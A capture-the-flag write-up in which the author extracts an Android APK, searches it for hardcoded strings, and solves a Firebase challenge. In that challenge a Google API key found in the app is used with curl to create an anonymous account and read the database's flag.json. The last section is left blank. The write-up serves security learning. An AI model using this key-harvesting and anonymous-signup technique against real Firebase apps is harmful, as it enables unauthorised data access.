# Static Analysis
###### Flag found: *"FAM{str1ngs_d0nt_l13_1n_n4t1v3_l4nd}"*
Location: libfam.so

It was stated in the challenge description that the flag has been left in plaintext in the codebase by the developer by mistake. 
###### Steps Followed:
1. As the main file was **fam-ctf.apk**
	- First convert the .apk file to .zip to extract the contents including the codebase as well.
	- Instead of using the second command, you can also manually extract the zip file.
```bash
copy fam-ctf.apk fam-ctf.zip
tar -xf fam-ctf.zip
```

2. Instead of blinding or randomly looking, let's go step-by-step:
   - Look for similar strings like *flag, FAM, secrets, config, credentials,* etc. As flags are often hardcoded as well.
   - Check config files.
   - Look for encoded strings.
     
3. We found the flag by the first step itself.
```bash
findstr /s /i "flag" *
findstr /s /i "secrets" *
findstr /s /i "FAM{" *        //FOUND THE FLAG
``` 

---
# Firebase - 1
###### Flag found: *"FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}"*
Location: http://{databaseurl}/flag.json?auth=idToken

It was stated in the description that no hard authentication or authorization was in place. We just need to look at the right place.
###### Steps Followed:
1. Goal is to find - 
   - Firebase config file
   - Extract database URL
   - Access it via browser/tool
   - Navigate paths to correct place to find the flag

2. Start finding database url, mostly they contain - firebaseio.com, rtdb, databaseURL, http://
```bash
findstr /s /i "firebaseio" *
findstr /s /i "rtdb" *
findstr /s /i "https://" *
findstr /s /i "http://" *
```

3. From `findstr` we found the actual database URL
   URL: `https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app` 
   We also found another URLs, that might come in handy in future: `http://172.16.13.107:9000`
   `https://firebaseappcheck.googleapis.com/v1/projects/`

4. As root was blocked showing `{error: permission denied}`
```bash 
/flag.json  
/users.json  
/admin.json  
/ctf.json  
/data.json
/database.json
```

5. Trying all the possible files, they were still showing the same error, so we need another approach to solve this. 
   As in the description of this ctf it was mentioned - "identity is optional"
   - This usually means: Firebase **Authentication is optional / anonymous login is enabled**, not that the DB is fully open.
   
   **Easiest Way (No Coding Required):**
   ```bash
   https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/.json?auth=null
   
   OR
   
   https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/.json?
   print=pretty
   ```

6. As all the above methods didn't work, let's move onto next method - *searching for google_api_key*.
   As most google api key contains something like - `AIzaxxxxx` we can also use it to find the authentication key or ID.
   ```bash
    findstr /s /i "AIza" *
    
    //FOUND = AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww
   ```
   
6. Try accessing the database URL with the found api key/ID.
   As even after trying, we couldn't gain access and get the flag.
   Let's get the authentication ID through the API key we found using below command:
```bash
curl.exe -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww" `
-H "Content-Type: application/json" `
-d '{"returnSecureToken": true}'

RESPONSE LOOKS LIKE:
{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJhb.....",                         //THIS IS WHAT WE NEEDED
  "refreshToken": "A......",
  "expiresIn": "3600",
  "localId": "Ud9...."
}
```

7. Now using the idToken in the URL gives us the desired flag.
```bash
https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json?auth=idToken
```

# Firebase - 2
###### Flag found: 
Location: 

It was given in the description that for this challenge we need some kind of credentials or tokens for authentication and that something related to this is already present in the codebase.
##### Steps Followed:


---
